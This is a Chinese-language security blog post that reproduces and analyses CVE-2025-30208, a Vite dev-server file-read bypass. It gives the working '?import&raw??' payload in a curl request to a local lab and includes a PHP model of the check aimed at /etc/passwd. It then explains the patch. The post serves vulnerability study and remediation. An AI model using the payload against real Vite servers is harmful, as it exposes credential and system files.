#  深入Vite任意文件读取与分析复现   
 船山信安   2025-04-05 15:14  
  
# Vite 任意文件读取漏洞(CVE-2025-30208)  
  
   
## 前言  
  
   
  
看到群里有人发了一个链接  
https://github.com/ThumpBo/CVE-2025-30208-EXP  
  
   
  
发现这个漏洞危害很大很大，而且利用起来也是非常的容易  
  
   
  
而且资产也是比较多的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP95nE62M7DyhcRSzINm3WJTXOTb8vYGdLMrTI47w1FrxI1Iq1ias6CuupakKaBZicZ7ZtlzwStU5kg/640?wx_fmt=png&from=appmsg "")  
  
  
   
  
于是分析分析这个漏洞  
  
   
## 漏洞描述  
  
   
  
Vite 是一个现代前端构建工具，为 Web 项目提供更快、更精简的开发体验。它主要由两部分组成：具有热模块替换（HMR）功能的开发服务器，以及使用 Rollup 打包代码的构建命令。在 Vite 6.2.3、6.1.2、6.0.12、5.4.15 和 4.5.10 版本之前，用于限制访问 Vite 服务允许列表之外的文件的 server.fs.deny 功能可被绕过。通过在 URL 的@fs 前缀后增加?raw??或?import&raw??，攻击者可以读取文件系统上的任意文件。  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP95nE62M7DyhcRSzINm3WJmHVBssK6qs3419A5wmsQZLMuUWQkLYy6HiafaBrKogCqtuvdclu3Z2g/640?wx_fmt=png&from=appmsg "")  
  
   
  
  
   
  
影响版本  
  
   
  
  
   
```
Affected versions>= 6.2.0, < 6.2.3>= 6.1.0, < 6.1.2>= 6.0.0, < 6.0.12>= 5.0.0, < 5.4.15< 4.5.10Patched versions6.2.36.1.26.0.125.4.154.5.10
```  
## 环境搭建  
  
   
  
参考  
  
https://github.com/advisories/GHSA-x574-m823-4x7w  
  
   
  
按照要求我们进行如下搭建  
  
   
```
┌──(root㉿kali)-[/home/lll/Desktop]└─# npm create vite@6.2.0 Need to install the following packages:  create-vite@6.2.0Ok to proceed? (y) y✔ Project name: … vite-project✔ Select a framework: › Vanilla✔ Select a variant: › TypeScriptScaffolding project in /home/lll/Desktop/vite-project...Done. Now run:  cd vite-project  npm install  npm run dev
```  
  
可能会遇到虽然指定了版本，但是任然会安装最新的问题  
  
   
  
  
   
```
┌──(root㉿kali)-[/home/lll/Desktop]└─# cd vite-project                                                                                                                                                                                         ┌──(root㉿kali)-[/home/lll/Desktop/vite-project]└─# npm install               added 12 packages in 21s3 packages are looking for funding  run `npm fund` for details                                                                                                                                                                                         ┌──(root㉿kali)-[/home/lll/Desktop/vite-project]└─# npm run dev> vite-project@0.0.0 dev> vite  VITE v6.2.3  ready in 190 ms  ➜  Local:   http://localhost:5173/  ➜  Network: use --host to expose  ➜  press h + enter to show help
```  
  
这样即可解决  
  
   
```
┌──(root㉿kali)-[/home/lll/Desktop/vite-project]└─# npm install vite@6.2.0 --save-devchanged 1 package in 6s3 packages are looking for funding  run `npm fund` for details                                                                                                                                                                                         ┌──(root㉿kali)-[/home/lll/Desktop/vite-project]└─# npm run dev> vite-project@0.0.0 dev> vite14:51:51 [vite] (client) Re-optimizing dependencies because lockfile has changed  VITE v6.2.0  ready in 222 ms  ➜  Local:   http://localhost:5173/  ➜  Network: use --host to expose  ➜  press h + enter to show help
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP95nE62M7DyhcRSzINm3WJwOhqg9ouUmgpy1ZJzic5IVsPd8cfAgKttPVWZnmfOyQiaLzAB3f8kkWw/640?wx_fmt=png&from=appmsg "")  
  
   
  
搭建成功如下  
  
   
  
然后写入文件  
  
   
```
┌──(root㉿kali)-[/home/lll]└─# echo "top secret content" > /tmp/secret.txt
```  
## 漏洞复现  
  
   
  
首先是正常去访问我们的文件  
  
   
```
┌──(root㉿kali)-[/home/lll]└─# curl "http://localhost:5173/@fs/tmp/secret.txt"    <body>      <h1>403 Restricted</h1>      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.<br/><br/>- /home/lll/Desktop/vite-project<br/><br/>Refer to docs https://vite.dev/config/server-options.html#server-fs-allow for configurations and more details.</p>      <style>        body {          padding: 1em 2em;        }      </style>    </body>
```  
  
可以发现访问失败了  
  
   
  
但是如果我们使用 payload 去访问  
  
   
```
──(root㉿kali)-[/home/lll]└─# curl "http://localhost:5173/@fs/tmp/secret.txt?import&raw??"export default "top secret content\n"//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNlY3JldC50eHQ/aW1wb3J0JnJhdz8iXSwic291cmNlc0NvbnRlbnQiOlsiZXhwb3J0IGRlZmF1bHQgXCJ0b3Agc2VjcmV0IGNvbnRlbnRcXG5cIiJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQSxNQUFNLENBQUMsT0FBTyxDQUFDLENBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQyxPQUFPLENBQUMsQ0FBQyJ9 
```  
  
得到了我们的内容  
  
   
## 漏洞分析与修复  
  
   
  
Vite 使用 server.fs.allow 机制控制允许访问的目录范围  
  
   
```
export function isFileServingAllowed(  config: ResolvedConfig,  url: string,): boolean/** * @deprecated Use the `isFileServingAllowed(config, url)` signature instead. */export function isFileServingAllowed(  url: string,  server: ViteDevServer,): booleanexport function isFileServingAllowed(  configOrUrl: ResolvedConfig | string,  urlOrServer: string | ViteDevServer,): boolean {  const config = (    typeof urlOrServer === 'string' ? configOrUrl : urlOrServer.config  ) as ResolvedConfig  const url = (    typeof urlOrServer === 'string' ? urlOrServer : configOrUrl  ) as string  if (!config.server.fs.strict) return true  const filePath = fsPathFromUrl(url)  return isFileLoadingAllowed(config, filePath)}function isUriInFilePath(uri: string, filePath: string) {  return isSameFileUri(uri, filePath) || isParentDirectory(uri, filePath)}export function isFileLoadingAllowed(  config: ResolvedConfig,  filePath: string,): boolean {  const { fs } = config.server  if (!fs.strict) return true  if (config.fsDenyGlob(filePath)) return false  if (config.safeModulePaths.has(filePath)) return true  if (fs.allow.some((uri) => isUriInFilePath(uri, filePath))) return true  return false}export function ensureServingAccess(  url: string,  server: ViteDevServer,  res: ServerResponse,  next: Connect.NextFunction,): boolean {  if (isFileServingAllowed(url, server)) {    return true  }  if (isFileReadable(cleanUrl(url))) {    const urlMessage = `The request url "${url}" is outside of Vite serving allow list.`    const hintMessage = `${server.config.server.fs.allow.map((i) => `- ${i}`).join('\n')}Refer to docs https://vite.dev/config/server-options.html#server-fs-allow for configurations and more details.`    server.config.logger.error(urlMessage)    server.config.logger.warnOnce(hintMessage + '\n')    res.statusCode = 403    res.write(renderRestrictedErrorHTML(urlMessage + '\n' + hintMessage))    res.end()  } else {    // if the file doesn't exist, we shouldn't restrict this path as it can    // be an API call. Middlewares would issue a 404 if the file isn't handled    next()  }  return false}function renderRestrictedErrorHTML(msg: string): string {  // to have syntax highlighting and autocompletion in IDE  const html = String.raw  return html`    <body>      <h1>403 Restricted</h1>      <p>${escapeHtml(msg).replace(/\n/g, '<br/>')}</p>      <style>        body {          padding: 1em 2em;        }      </style>    </body>  `}
```  
  
isFileServingAllowed: 判断某个 URL 是否允许被 Vite 服务器访问。  
  
   
  
isFileLoadingAllowed: 具体检查某个文件路径是否符合 Vite 的文件访问规则。  
  
   
  
ensureServingAccess: 处理 HTTP 请求，如果文件不被允许访问，则返回 403  
  
   
  
可以看到逻辑就是只允许 fs.allow 目录下的文件被访问  
  
   
  
对应的防护机制是 server.fs.deny  
  
   
  
参考 diff 部分  
  
   
  
https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1#diff-6d94d6934079a4f09596acc9d3f3d38ea426c6f8e98cd766567335d42679ca7cR176  
  
   
  
  
   
```
export function transformMiddleware(  server: ViteDevServer,): Connect.NextHandleFunction {  // Keep the named function. The name is visible in debug logs via DEBUG=connect:dispatcher ...  // check if public dir is inside root dir  const { root, publicDir } = server.config  const publicDirInRoot = publicDir.startsWith(withTrailingSlash(root))  const publicPath = ${publicDir.slice(root.length)}/  return async function viteTransformMiddleware(req, res, next) {    const environment = server.environments.client    if (req.method !== 'GET' || knownIgnoreList.has(req.url!)) {      return next()    }    let url: string    try {      url = decodeURI(removeTimestampQuery(req.url!)).replace(        NULL_BYTE_PLACEHOLDER,        '\0',      )    } catch (e) {      return next(e)    }    const withoutQuery = cleanUrl(url)    try {      const isSourceMap = withoutQuery.endsWith('.map')      // since we generate source map references, handle those requests here      if (isSourceMap) {        const depsOptimizer = environment.depsOptimizer        if (depsOptimizer?.isOptimizedDepUrl(url)) {          // If the browser is requesting a source map for an optimized dep, it          // means that the dependency has already been pre-bundled and loaded          const sourcemapPath = url.startsWith(FS_PREFIX)            ? fsPathFromId(url)            : normalizePath(path.resolve(server.config.root, url.slice(1)))          try {            const map = JSON.parse(              await fsp.readFile(sourcemapPath, 'utf-8'),            ) as ExistingRawSourceMap            applySourcemapIgnoreList(              map,              sourcemapPath,              server.config.server.sourcemapIgnoreList,              server.config.logger,            )            return send(req, res, JSON.stringify(map), 'json', {              headers: server.config.server.headers,            })          } catch {            // Outdated source map request for optimized deps, this isn't an error            // but part of the normal flow when re-optimizing after missing deps            // Send back an empty source map so the browser doesn't issue warnings            const dummySourceMap = {              version: 3,              file: sourcemapPath.replace(/\.map$/, ''),              sources: [],              sourcesContent: [],              names: [],              mappings: ';;;;;;;;;',            }            return send(req, res, JSON.stringify(dummySourceMap), 'json', {              cacheControl: 'no-cache',              headers: server.config.server.headers,            })          }        } else {          const originalUrl = url.replace(/\.map($|\?)/, '$1')          const map = (            await environment.moduleGraph.getModuleByUrl(originalUrl)          )?.transformResult?.map          if (map) {            return send(req, res, JSON.stringify(map), 'json', {              headers: server.config.server.headers,            })          } else {            return next()          }        }      }      if (publicDirInRoot && url.startsWith(publicPath)) {        warnAboutExplicitPublicPathInUrl(url)      }      if (        (rawRE.test(url) || urlRE.test(url)) &&        !ensureServingAccess(url, server, res, next)      ) {        return      }
```  
  
在处理浏览器的请求的时候  
  
   
```
if (  (rawRE.test(url) || urlRE.test(url)) &&  !ensureServingAccess(url, server, res, next)) {  return}
```  
  
其对应的正则匹配模式如下  
  
packages\vite\src\node\utils.ts  
  
   
```
export const urlRE = /(\?|&)url(?:&|$)/export const rawRE = /(\?|&)raw(?:&|$)/
```  
  
然后就是检测我们是否有访问权限  
  
   
```
export function ensureServingAccess(  url: string,  server: ViteDevServer,  res: ServerResponse,  next: Connect.NextFunction,): boolean {  if (isFileServingAllowed(url, server)) {    return true  }  if (isFileReadable(cleanUrl(url))) {    const urlMessage = `The request url "${url}" is outside of Vite serving allow list.`    const hintMessage = `${server.config.server.fs.allow.map((i) => `- ${i}`).join('\n')}Refer to docs https://vite.dev/config/server-options.html#server-fs-allow for configurations and more details.`    server.config.logger.error(urlMessage)    server.config.logger.warnOnce(hintMessage + '\n')    res.statusCode = 403    res.write(renderRestrictedErrorHTML(urlMessage + '\n' + hintMessage))    res.end()  } else {    // if the file doesn't exist, we shouldn't restrict this path as it can    // be an API call. Middlewares would issue a 404 if the file isn't handled    next()  }  return false}
```  
  
而我们的绕过就是在于刚刚的正则匹配部分  
  
   
```
<?phpfunction ensureServingAccess($url) {    // 这里假设是一个访问控制检查的函数，简单返回 false    return false;}// 定义正则表达式$urlRE = '/(\?|&)url(?:&|$)/';$rawRE = '/(\?|&)raw(?:&|$)/';// 测试 URL$url = "/@fs/etc/passwd?import&raw??";if (preg_match($rawRE, $url) || preg_match($urlRE, $url)) {    if (!ensureServingAccess($url)) {        echo "Access Denied!";        return;    }}echo "Access Granted!";?>//输出Access Granted!
```  
  
通过对敏感路径加入?raw?? 或 ?import&raw??首先成功通过了正则匹配，而我们的这个 url 被输入 ensureServingAccess 的时候，又会被判定为不是系统文件成功绕过两个  
  
   
  
我们看看修复部分是如何修复的  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP95nE62M7DyhcRSzINm3WJu2oTooEDsOxWJTqZrfrEG6sbrQ1MftozKo9BWyZc7mlNPHS63RkSLg/640?wx_fmt=png&from=appmsg "")  
  
   
  
在正则匹配之前都会使用 urlWithoutTrailingQuerySeparators 方法去处理  
  
   
```
const urlWithoutTrailingQuerySeparators = url.replace(  trailingQuerySeparatorsRE,  '',)
```  
  
trailingQuerySeparatorsRE 对应如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7nIrJAgaibicP95nE62M7DyhcRSzINm3WJ4ao5OoibU14D4rQZEUAjJM2NuaPbOujA9aWyoaozP9YDTYONCzNQ6Fw/640?wx_fmt=png&from=appmsg "")  
  
  
   
```
const urlWithoutTrailingQuerySeparators = url.replace(  trailingQuerySeparatorsRE,  '',)if (  (rawRE.test(urlWithoutTrailingQuerySeparators) ||    urlRE.test(urlWithoutTrailingQuerySeparators)) &&  !ensureServingAccess(    urlWithoutTrailingQuerySeparators,    server,    res,    next,  )) {  return}
```  
  
而且权限检测现在是检测 urlWithoutTrailingQuerySeparators 处理后的文件了  
  
   
  
  
   
```
<?phpfunction ensureServingAccess($url) {    // 这里假设是一个访问控制检查的函数，简单返回 false    return false;}// 定义正则表达式$urlRE = '/(\?|&)url(?:&|$)/';$rawRE = '/(\?|&)raw(?:&|$)/';$trailingQuerySeparatorsRE = '/[?&]+$/';// 测试 URL$url = "/@fs/etc/passwd?import&raw??";// 去除尾随 ? 和 &$urlWithoutTrailingQuerySeparators = preg_replace($trailingQuerySeparatorsRE, '', $url);if (preg_match($rawRE, $urlWithoutTrailingQuerySeparators) || preg_match($urlRE, $urlWithoutTrailingQuerySeparators)) {    if (!ensureServingAccess($urlWithoutTrailingQuerySeparators)) {        echo "Access Denied!";        return;    }}echo "Access Granted!";?>
```  
  
会输出 Access Denied!  
  
   
  
这样成功防止了我们的漏洞  
  
  
原文件不好调试，把逻辑移动到了自己文件上看效果  
  
  
  
转自：  
https://xz.aliyun.com/news/17488  
  
